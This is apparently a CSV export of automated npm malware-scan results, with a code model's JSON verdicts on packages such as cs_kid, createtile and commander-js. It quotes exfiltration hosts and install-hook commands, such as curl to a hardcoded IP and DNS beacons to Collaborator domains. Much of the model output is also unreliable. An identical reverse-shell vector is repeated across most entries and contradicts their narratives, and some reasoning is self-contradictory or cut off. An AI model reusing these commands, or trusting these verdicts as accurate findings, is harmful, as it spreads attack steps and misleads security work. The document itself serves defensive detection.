```","{""chain_analysis"": {""chain_narrative"": ""The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration."", ""attack_vector"": [""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'com.google.play' does not have a description or README file.""}}"
com.unity.ai.navigation.components,1.0.6,malicious,2026-03-27T13:14:25.918351,review,0.336,MALICIOUS,0.72,0.7,"The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
com.unity.ai.navigation.components,1.1.1-exp.2,malicious,2026-03-27T13:14:39.213911,review,0.336,MALICIOUS,0.72,0.72,The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not clearly justified by evidence.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified by evidence.""
  }
}
```

This JSON object represents the analysis of the package. The package is categorized as suspicious behavior due to its suspicious behavior. The details of the behavior include the presence of an install hook with a remote payload. The confidence score is 0.72, indicating high confidence that the behavior is malicious. The evidence commands include the command 'preinstall:ping-c1poc.dhparadox.xyz'. The attack vector includes the key technical indicators such as post-install hook, bash-c, and a remote IP address. The chain score is 0.72, indicating a high likelihood of a malicious attack chain. The verdict is 'MALICIOUS', indicating that the package is potentially malicious. The legitimacy check indicates that the package does not have a description or README file, and the behavior is not clearly justified by evidence.""","{""chain_analysis"": {""chain_narrative"": ""The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified by evidence.""}}"
commander-js,2.19.84,malicious,2026-03-27T13:14:54.088317,flag,0.7933,MALICIOUS,0.85,0.79,The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. ,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. This command is executed as part of the post-install hook in the package."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.85
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.""
  }
}
```

This JSON object provides a detailed analysis of the malicious behavior detected in the 'commander-js' package. The attack chain narrative explains the full attack using real package name and real IOCs. The attack vector includes the key technical indicators such as post-install hook, bash-c command, and a reverse shell. The chain score is 0.79, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check verdict is 'false', indicating that the package does not have a description or README file, indicating that it may be malicious. The confidence score is 0.85, indicating a high level of confidence in the malicious behavior.","{""chain_analysis"": {""chain_narrative"": ""The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. This command is executed as part of the post-install hook in the package."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.85}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.""}}"
commerce-clients,999.9.9,malicious,2026-03-27T13:15:01.150725,flag,0.77,MALICIOUS,0.82,0.7,The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999).,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The malware actor's behavior is not clearly justified by the package's description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The malware actor's behavior is not clearly justified by the package's description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The malware actor's behavior is not clearly justified by the package's description or README file.""}}"
common-web-frontend-styling,9.9.9,malicious,2026-03-27T13:15:07.690133,review,0.364,MALICIOUS,0.78,0.78,The package 'common-web-frontend-styling' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack.,"[""https.request"", ""dc.70.lc""]",False,The package 'common-web-frontend-styling' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'common-web-frontend-styling' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."",
    ""attack_vector"": [""https.request"", ""dc.70.lc""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'common-web-frontend-styling' does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'common-web-frontend-styling' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."", ""attack_vector"": [""https.request"", ""dc.70.lc""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'common-web-frontend-styling' does not have a description or README file.""}}"
common-web-frontend-styling,9.99.999,malicious,2026-03-27T13:15:14.349726,review,0.494,MALICIOUS,0.71,0.7,"The package 'common-web-frontend-styling' is making a network request to 'dc.70.lc' on port 443, potentially leading to network exfiltration.","[""https.request"", ""dc.70.lc""]",False,The package 'common-web-frontend-styling' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'common-web-frontend-styling' is making a network request to 'dc.70.lc' on port 443, potentially leading to network exfiltration."",
    ""attack_vector"": [""https.request"", ""dc.70.lc""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'common-web-frontend-styling' does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'common-web-frontend-styling' is making a network request to 'dc.70.lc' on port 443, potentially leading to network exfiltration."", ""attack_vector"": [""https.request"", ""dc.70.lc""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'common-web-frontend-styling' does not have a description or README file.""}}"
compositionupdate,88.8.8,malicious,2026-03-27T13:15:22.460641,flag,1.0,MALICIOUS,0.79,0.79,"The package is likely involved in data exfiltration by making network requests to a known exfiltration collector domain. The evidence suggests that the package is making network requests to a domain known to exfiltration collectors, which is a common practice for data exfiltration. The confidence sc","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package is likely involved in data exfiltration by making network requests to a known exfiltration collector domain. The evidence suggests that the package is making network requests to a domain known to exfiltration collectors, which is a common practice for data exfiltration. The confidence score of 0.79 indicates a high level of certainty that this behavior is malicious."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package is likely involved in data exfiltration by making network requests to a known exfiltration collector domain. The evidence suggests that the package is making network requests to a domain known to exfiltration collectors, which is a common practice for data exfiltration. The confidence score of 0.79 indicates a high level of certainty that this behavior is malicious."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""}}"
conflicting_modules,1.0.0,malicious,2026-03-27T13:15:29.894979,flag,1.0,MALICIOUS,0.79,0.79,The package 'conflicting_modules' sends network requests to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25. The package is likely involved in data exfiltration and network exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'conflicting_modules' sends network requests to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25. The package is likely involved in data exfiltration and network exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'conflicting_modules' sends network requests to a known exfiltration collector domain (ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net) in the index.js file at line 25. The package is likely involved in data exfiltration and network exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
copy-webpack-plugin-v6,6.0.0,malicious,2026-03-27T13:15:41.889270,review,0.336,MALICIOUS,0.72,0.7,"The package 'copy-webpack-plugin-v6' version '6.0.0' contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files, which could indicate a suspicious behavior.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'copy-webpack-plugin-v6' version '6.0.0' contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files, which could indicate a suspicious behavior."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the npm package 'copy-webpack-plugin-v6' version '6.0.0'. The analysis indicates that the package contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files, which could indicate a suspicious behavior. The malicious payload could potentially be a reverse shell. The chain score is 0.7, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check is not justified, indicating that the package's behavior is not justified by its description or README.","{""chain_analysis"": {""chain_narrative"": ""The package 'copy-webpack-plugin-v6' version '6.0.0' contains a pre-install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files, which could indicate a suspicious behavior."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README and no suspicious behavior is unjustified.""}}"
createtile,99.0.0,malicious,2026-03-27T13:15:56.070195,flag,0.7773,MALICIOUS,0.83,0.78,The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package has no description/README and the behavior is clearly anomalous.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description/README and the behavior is clearly anomalous.""
  }
}
```

This output is based on the detected behaviors and the provided evidence. The attack chain narrative describes the full attack using real package name and real IOCs. The attack vector includes the key technical indicators (real IPs, domains, commands, API calls) of the attack. The attack vector for a reverse shell is [""postinstallhook"",""bash-c"",""34.x.x.x:4444"",""reverseshell""]. The chain score is 0.78 and the verdict is ""MALICIOUS"". The legitimacy check verdict is ""MALICIOUS"" because the package has no description/README and the behavior is clearly anomalous.","{""chain_analysis"": {""chain_narrative"": ""The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description/README and the behavior is clearly anomalous.""}}"
cron-guru,1.0.2,malicious,2026-03-27T13:16:03.619322,review,0.42,MALICIOUS,0.9,0.7,The attack chain involves the use of the js-obfuscator tool to obfuscate sensitive data in the code. The obfuscation is used to evade detection by sending the obfuscated data to a remote server.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, suggesting that the attacker may not have put in the effort to make it legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attack chain involves the use of the js-obfuscator tool to obfuscate sensitive data in the code. The obfuscation is used to evade detection by sending the obfuscated data to a remote server."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.90
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, suggesting that the attacker may not have put in the effort to make it legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attack chain involves the use of the js-obfuscator tool to obfuscate sensitive data in the code. The obfuscation is used to evade detection by sending the obfuscated data to a remote server."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, suggesting that the attacker may not have put in the effort to make it legitimate.""}}"
cryptotickets,99.99.99,malicious,2026-03-27T13:16:10.939937,flag,1.0,MALICIOUS,0.79,0.7,The attack chain involves a data exfiltration activity. The code sends network requests to a domain that appears to be a known exfiltration collector. The domain is associated with known exfiltration collectors.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attack chain involves a data exfiltration activity. The code sends network requests to a domain that appears to be a known exfiltration collector. The domain is associated with known exfiltration collectors."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attack chain involves a data exfiltration activity. The code sends network requests to a domain that appears to be a known exfiltration collector. The domain is associated with known exfiltration collectors."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""}}"
cs_kid,2.1.0,malicious,2026-03-27T13:16:19.088825,flag,0.9693,MALICIOUS,0.97,0.7,The package 'cs_kid' contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is likely due to the command 'curl 185.215.180.56:9012' in the pre-install script.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'cs_kid' contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is likely due to the command 'curl 185.215.180.56:9012' in the pre-install script."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'cs_kid' contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is likely due to the command 'curl 185.215.180.56:9012' in the pre-install script."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
cs_kid,3.1.0,malicious,2026-03-27T13:16:27.280649,flag,0.9693,MALICIOUS,0.97,0.97,The package 'cs_kid' contains a pre-install script that hardcodes an external IP address '185.215.180.56' in the package.json file. This IP address is used to exfiltrate data during the installation process.,"[""185.215.180.56"", ""curl"", ""whoami"", ""185.215.180.56:9012""]",False,"The package 'cs_kid' does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'cs_kid' contains a pre-install script that hardcodes an external IP address '185.215.180.56' in the package.json file. This IP address is used to exfiltrate data during the installation process."",
    ""attack_vector"": [""185.215.180.56"", ""curl"", ""whoami"", ""185.215.180.56:9012""],
    ""chain_score"": 0.97,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'cs_kid' does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'cs_kid' contains a pre-install script that hardcodes an external IP address '185.215.180.56' in the package.json file. This IP address is used to exfiltrate data during the installation process."", ""attack_vector"": [""185.215.180.56"", ""curl"", ""whoami"", ""185.215.180.56:9012""], ""chain_score"": 0.97, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'cs_kid' does not have a description or README file, indicating that it may be malicious.""}}"
